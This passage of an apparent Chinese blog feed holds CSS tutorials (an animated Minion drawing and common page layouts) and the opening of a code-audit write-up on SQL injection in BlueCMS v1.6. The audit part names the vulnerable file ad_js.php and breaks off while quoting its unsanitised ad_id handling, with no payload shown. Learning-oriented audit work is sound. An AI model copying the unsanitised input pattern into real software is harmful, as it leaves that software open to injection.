class="line"><span class="attribute">width</span>: <span class="number">8px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">8px</span>;</span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">50%</span>;</span><br><span class="line"><span class="attribute">background</span>: <span class="number">#000</span>;</span><br><span class="line"><span class="attribute">position</span>: absolute;</span><br><span class="line"><span class="attribute">top</span>: <span class="number">4px</span>;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">88px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.body</span> <span class="selector-class">.belt</span> <span class="selector-class">.left</span><span class="selector-pseudo">:after</span> &#123;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">5px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里要用：after伪类来实现这里的小黑点，可以看到我用了border-radius,这里就是通过设置元素的<em>border-radius</em>值,可以轻松给元素设置圆角边框先看到下效果图吧</p><p><img src="/images/mini/1563111581677.png" alt="1563111581677"></p><p>接下直接把口袋画好和线条画好</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 口袋 */</span></span><br><span class="line"><span class="selector-class">.pockets</span> &#123;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">60px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">45px</span>;</span><br><span class="line"><span class="attribute">border</span>: <span class="number">6px</span> solid <span class="number">#000</span>;</span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">0px</span> <span class="number">0px</span> <span class="number">25px</span> <span class="number">25px</span>;</span><br><span class="line"><span class="attribute">position</span>: absolute;</span><br><span class="line"><span class="attribute">bottom</span>: <span class="number">65px</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">84px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 左右两边的线条*/</span></span><br><span class="line"><span class="selector-class">.line-right</span>&#123;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">30px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">30px</span>;</span><br><span class="line"><span class="attribute">border-bottom-left-radius</span>: <span class="number">100px</span>;</span><br><span class="line"><span class="attribute">border-bottom</span>: <span class="number">6px</span> solid <span class="number">#000</span>;</span><br><span class="line"><span class="attribute">border-left</span>: <span class="number">6px</span> solid <span class="number">#000</span>;</span><br><span class="line"><span class="attribute">position</span>: absolute;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line"><span class="attribute">bottom</span>: <span class="number">60px</span>;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">rotate</span>(-75deg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.line-left</span> &#123;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">30px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">30px</span>;</span><br><span class="line"><span class="attribute">border-bottom-right-radius</span>: <span class="number">100px</span>;</span><br><span class="line"><span class="attribute">border-bottom</span>: <span class="number">6px</span> solid <span class="number">#000</span>;</span><br><span class="line"><span class="attribute">border-right</span>: <span class="number">6px</span> solid <span class="number">#000</span>;</span><br><span class="line"><span class="attribute">position</span>: absolute;</span><br><span class="line"><span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line"><span class="attribute">bottom</span>: <span class="number">63px</span>;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">rotate</span>(75deg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/mini/1563112075313.png" alt="1563112075313"></p><p>这里需要注意的</p><p>1.可以看到裤子两边有两条有弧度的曲线段，我是通过给矩形某一个角实现圆角效果，然后只设置与这个角相邻的两条边的边框样式，使用transform然后旋转一下角度就实现这个效果了。接下来把眼睛这些画好</p><p>看下效果吧</p><p><img src="/images/mini/1563113068118.png" alt="1563113068118"></p><p>这里由于我放的是图片其实这里的眼睛已经可以动了，这里采用<code>animation</code>css3的属性，它总共有6个动画</p><p><img src="/images/mini/1563113519271.png" alt="1563113519271"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">keyframes</span> white-eye &#123;</span><br><span class="line">0%,</span><br><span class="line">20%,</span><br><span class="line">50%,</span><br><span class="line">70%,</span><br><span class="line">100% &#123;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">translateX</span>(0px);</span><br><span class="line">&#125;</span><br><span class="line">30%,</span><br><span class="line">40% &#123;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">translate3d</span>(3px, 4px, 0);</span><br><span class="line">&#125;</span><br><span class="line">80%,</span><br><span class="line">90% &#123;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">translate3d</span>(-15px, 4px, 0);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.eyes</span> <span class="selector-class">.left_eye</span> <span class="selector-class">.left_black_eye</span> <span class="selector-class">.left_white</span>,</span><br><span class="line"><span class="selector-class">.eyes</span> <span class="selector-class">.right_eye</span> <span class="selector-class">.right_black_eye</span> <span class="selector-class">.right_white</span> &#123;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">20px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">20px</span>;</span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">50%</span>;</span><br><span class="line"><span class="attribute">background</span>: <span class="number">#fff</span>;</span><br><span class="line"><span class="attribute">position</span>: absolute;</span><br><span class="line"><span class="attribute">top</span>: <span class="number">7px</span>;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">17px</span>;</span><br><span class="line"><span class="attribute">animation</span>: white-eye <span class="number">5s</span> ease-in-out infinite;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来就是嘴巴手都画好</p><p><img src="/images/mini/1563114400081.png" alt="1563114400081"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.hands</span> &#123;</span><br><span class="line"><span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.hands</span> <span class="selector-class">.left-hand</span>,</span><br><span class="line"><span class="selector-class">.hands</span> <span class="selector-class">.right-hand</span> &#123;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">80px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">80px</span>;</span><br><span class="line"><span class="attribute">border</span>: <span class="number">6px</span> solid <span class="number">#000</span>;</span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">25px</span>;</span><br><span class="line"><span class="attribute">background</span>: <span class="built_in">rgb</span>(249, 217, 70);</span><br><span class="line"><span class="attribute">position</span>: absolute;</span><br><span class="line"><span class="attribute">top</span>: <span class="number">220px</span>;</span><br><span class="line"><span class="attribute">left</span>: -<span class="number">23px</span>;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">rotate</span>(40deg);</span><br><span class="line"><span class="attribute">animation</span>: right-hand .<span class="number">8s</span> ease-in-out infinite;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="keyword">keyframes</span> right-hand &#123;</span><br><span class="line">0%,</span><br><span class="line">50%,</span><br><span class="line">100% &#123;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">rotate</span>(40deg);</span><br><span class="line">&#125;</span><br><span class="line">30% &#123;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">rotate</span>(37deg) <span class="built_in">translateX</span>(1px);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.hands</span> <span class="selector-class">.left-hand</span> &#123;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">182px</span>;</span><br><span class="line"><span class="attribute">top</span>: <span class="number">220px</span>;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">rotate</span>(-40deg);</span><br><span class="line"><span class="attribute">animation</span>: left-hand .<span class="number">8s</span> ease-in-out infinite;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="keyword">keyframes</span> left-hand &#123;</span><br><span class="line">0%,</span><br><span class="line">50%,</span><br><span class="line">100% &#123;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">rotate</span>(-40deg);</span><br><span class="line">&#125;</span><br><span class="line">80% &#123;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">rotate</span>(-37deg) <span class="built_in">translateX</span>(-1px);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.hands</span> <span class="selector-class">.left-hand</span><span class="selector-pseudo">:after</span>,</span><br><span class="line"><span class="selector-class">.hands</span> <span class="selector-class">.right-hand</span><span class="selector-pseudo">:after</span> &#123;</span><br><span class="line"><span class="attribute">content</span>: <span class="string">''</span>;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">6px</span>;</span><br><span class="line"><span class="attribute">border</span>: <span class="number">3px</span> solid <span class="number">#000</span>;</span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">3px</span>;</span><br><span class="line"><span class="attribute">position</span>: absolute;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">13px</span>;</span><br><span class="line"><span class="attribute">top</span>: <span class="number">50px</span>;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">rotate</span>(90deg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.hands</span> <span class="selector-class">.left-hand</span><span class="selector-pseudo">:after</span> &#123;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">53px</span>;</span><br><span class="line"><span class="attribute">top</span>: <span class="number">50px</span>;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">rotate</span>(-90deg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>放一下最后的成品图吧</p><p><img src="/images/mini/1563115262916.png" alt="1563115262916"></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;这里是为了巩固这几天学的知识所以决定写这个小案例，这里简单说一下&lt;/p&gt;
    
    </summary>
    
      <category term="前端" scheme="http://onekingcc.github.io/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="css" scheme="http://onekingcc.github.io/tags/css/"/>
    
  </entry>
  
  <entry>
    <title>页面中的常见布局</title>
    <link href="http://onekingcc.github.io/2019/07/11/%E5%B7%A9%E5%9B%BA%E9%A1%B5%E9%9D%A2%E4%B8%AD%E7%9A%84%E5%B8%B8%E8%A7%81%E5%B8%83%E5%B1%80/"/>
    <id>http://onekingcc.github.io/2019/07/11/巩固页面中的常见布局/</id>
    <published>2019-07-11T14:23:40.252Z</published>
    <updated>2019-07-11T15:02:38.913Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在前端中布局显的非常重要，之前一直不怎么会布局今天抽空把之前学的总结一下便学习一下之前没有学到的然后记录下来，然后有了这篇文章。<a id="more"></a></p><h3 id="单列布局"><a href="#单列布局" class="headerlink" title="单列布局"></a>单列布局</h3><p>这种布局的特点就是头部，主体，底部，等宽，实现这种的单列布局的思路：就是首先有个大的div，设置宽度然后将头部主体和底部进行统一设置，容器里的子块只需要设置一下高度即可。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">   <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span></span><br><span class="line">        .conter&#123;</span><br><span class="line">            max-width: 960px;   /*设置最大宽度为960像素*/</span><br><span class="line">            margin: 0 auto;     /*内部的元素水平居中*/</span><br><span class="line">        &#125;</span><br><span class="line">        .head&#123;</span><br><span class="line">            height: 50px;</span><br><span class="line">            background: blue;</span><br><span class="line">        &#125;</span><br><span class="line">        .main&#123;</span><br><span class="line">            height: 500px;</span><br><span class="line">            background: pink;</span><br><span class="line">        &#125;</span><br><span class="line">        .footer&#123;</span><br><span class="line">            height: 50px;</span><br><span class="line">            background:olive;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--容器--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span> = <span class="string">"conter"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>= <span class="string">"head"</span>&gt;</span>头部<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"main"</span>&gt;</span>主体<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"footer"</span>&gt;</span>底部<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/htmlstyle/1562847435896.png" alt="1562847435896"></p><p>还有一种就是单列的布局就是： 宽度自适应内容居中布局，这种布局的特点就是：</p><ul><li><p>头部，和底部自适应页面的宽度，</p></li><li><p>主体固定宽度，要实现这种方式的布局思路：</p><p>1.将头部和尾部放在独立的容器中，</p><p>2.头部和尾部的内容和主体等度</p><p>3.主体仍单独放在单独的容器中，并设置水平居中</p><p>4.调整DOM结构</p></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--容器--&gt;</span></span><br><span class="line">   </span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>= <span class="string">"head"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span> = <span class="string">"conter"</span>&gt;</span> 头部 <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"main"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span> = <span class="string">"conter"</span>&gt;</span>主体 <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"footer"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span> = <span class="string">"conter"</span>&gt;</span> 底部<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/htmlstyle/1562848937251.png" alt="1562848937251"></p><p>可以发现他们的内容已经变成了自适应了也就是用矩形框圈的那部分</p><h3 id="两列布局"><a href="#两列布局" class="headerlink" title="两列布局"></a>两列布局</h3><p>两列布局有4种方式，</p><p>1.左侧固定右侧自适应</p><p>2.两列左右固定中间撑开父级块</p><p>3.右侧固定左侧自适应</p><p>4.两列左右两列绝对定位</p><p>先实现第1种</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">    .left&#123;</span><br><span class="line">        width: 200px;</span><br><span class="line">        height: 600px;</span><br><span class="line">        float: left;</span><br><span class="line">        background-color: cadetblue;</span><br><span class="line">    &#125;</span><br><span class="line">    .main&#123;</span><br><span class="line">        height: 600px;</span><br><span class="line">        background-color: blueviolet;</span><br><span class="line">        margin-left: 220px;/*大于等于左侧的宽度就行*/</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 1.左侧固定并设置左浮动 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 右侧主体部分设置一个右边框，它的宽度只要大于等于左边的宽度就可以 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span>左侧<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"main"</span>&gt;</span>主体<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/htmlstyle/562849915137.png" alt="1562849915137"></p><p>接下来说第3种右侧固定左边主体自适应，这个思路跟左边类似同理可得：</p><p><img src="/images/htmlstyle/1562850154381.png" alt="1562850154381"></p><p>现在来看一下第2种两列左右固定中间撑开父级块，这种实现的思路就是：两边采取浮动的方式定义一个父级块这里要考虑一个问题就是如何用子块来撑开父级块。这里采用的是利用after伪类让子块撑开父块。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">    .content&#123;</span><br><span class="line">        width: 960px;</span><br><span class="line">        margin: 0 auto;</span><br><span class="line">        background-color:burlywood;</span><br><span class="line">        overflow: hidden;</span><br><span class="line">    &#125;</span><br><span class="line">    .clear&#123;</span><br><span class="line">        -ms-zoom: 1;</span><br><span class="line">    &#125;</span><br><span class="line">    .clear:after&#123;</span><br><span class="line">        content: &apos;&apos;;</span><br><span class="line">        display: block;</span><br><span class="line">        clear: both;</span><br><span class="line">    &#125;</span><br><span class="line">    .left&#123;</span><br><span class="line">        width: 200px;</span><br><span class="line">        height: 600px;</span><br><span class="line">        background-color: aqua;</span><br><span class="line">        float: left;</span><br><span class="line">    &#125;</span><br><span class="line">    .right&#123;</span><br><span class="line">        width: 750px;</span><br><span class="line">        height: 600px;</span><br><span class="line">        background-color:rgb(13, 210, 224);</span><br><span class="line">        float: right;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;content clear&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;left&quot;&gt;左侧&lt;/div&gt;</span><br><span class="line">        &lt;div class=&quot;right&quot;&gt;右侧&lt;/div&gt;</span><br><span class="line">      </span><br><span class="line">    &lt;/div&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/htmlstyle/1562851770177.png" alt="1562851770177"></p><h3 id="三列布局"><a href="#三列布局" class="headerlink" title="三列布局"></a>三列布局</h3><p>1左右两列绝对定位，中间适应布局</p><p>特点：</p><ul><li><p>左右两列固定宽度</p></li><li><p>中间主体区自适应</p></li><li><p>采用浮动加外边距</p></li><li><p>区块的顺序非常重要</p><p>左右这里需要注意的就是先写左右在写主体，DOM顺序不能乱。，中间实际区域是用margin挤压出来，左右两边采用浮动+宽度，</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">        .left&#123;</span><br><span class="line">            width:200px;</span><br><span class="line">            height: 600px;</span><br><span class="line">            background-color:brown;</span><br><span class="line">            float: left;</span><br><span class="line">        &#125;</span><br><span class="line">        .right&#123;</span><br><span class="line">            width:200px;</span><br><span class="line">            height: 600px;</span><br><span class="line">            background-color:brown;</span><br><span class="line">            float: right;</span><br><span class="line">        &#125;</span><br><span class="line">        .main&#123;</span><br><span class="line">            height: 600px;</span><br><span class="line">            margin-left: 200px;</span><br><span class="line">            margin-right: 200px;</span><br><span class="line">            background-color: #fd8008;</span><br><span class="line">        &#125;</span><br><span class="line">   <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span>左侧<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span>右侧<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"main"</span>&gt;</span>主体<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="/images/htmlstyle/1562854674592.png" alt="1562854674592"></p></li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>每天都要有收获才行</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;在前端中布局显的非常重要，之前一直不怎么会布局今天抽空把之前学的总结一下便学习一下之前没有学到的然后记录下来，然后有了这篇文章。&lt;/p&gt;
    
    </summary>
    
      <category term="前端" scheme="http://onekingcc.github.io/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="页面布局" scheme="http://onekingcc.github.io/tags/%E9%A1%B5%E9%9D%A2%E5%B8%83%E5%B1%80/"/>
    
  </entry>
  
  <entry>
    <title>代码审计之SQL注入：bluecms_v1.6</title>
    <link href="http://onekingcc.github.io/2019/07/10/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%EF%BC%9Abluecms_v1.6/"/>
    <id>http://onekingcc.github.io/2019/07/10/代码审计之SQL注入：bluecms_v1.6/</id>
    <published>2019-07-10T02:59:19.706Z</published>
    <updated>2019-07-11T14:45:32.945Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这个cms的漏洞很早就爆出来了，而且很多网站都有相应的文章，这里只是针对自己在代码审计这方面学习的加强，因为自己太菜所以选了一个结构稍微简单，对新手友好一点的cms。<a id="more"></a></p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>PHPstdudy</p><p>Seay源代码审计系统</p><p>BlueCMS v1.6 sp1源码</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p><img src="/images/Bluecmssql/1562685158396.png" alt="1562685158396"></p><p>进入安装阶段，填写相应的数据库，数据库密码安装好之后就是这个界面</p><p><img src="/images/Bluecmssql/1562685307531.png" alt="1562685307531"></p><h3 id="开始审计"><a href="#开始审计" class="headerlink" title="开始审计"></a>开始审计</h3><p>​    这里由于只是静态的进行审计所以用的notepad++来查看源码然后我们直接把cms放到Seay这个系统里面审一下，当然这个误报挺多的不过对新手来说可以减少很多的工作量，这时我们发现扫出了来了一些。<img src="/2019/07/10/代码审计之SQL注入：bluecms_v1/D:%5Conekingcc%5Csource%5Cimages%5CBluecmssql%5C1562685737530.png" alt="1562685737530"></p><p>发现在upload/ad_js.php存在sql注入，这时我们跟进去看一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ad_id = !<span class="keyword">empty</span>($_GET[<span class="string">'ad_id'</span>]) ? 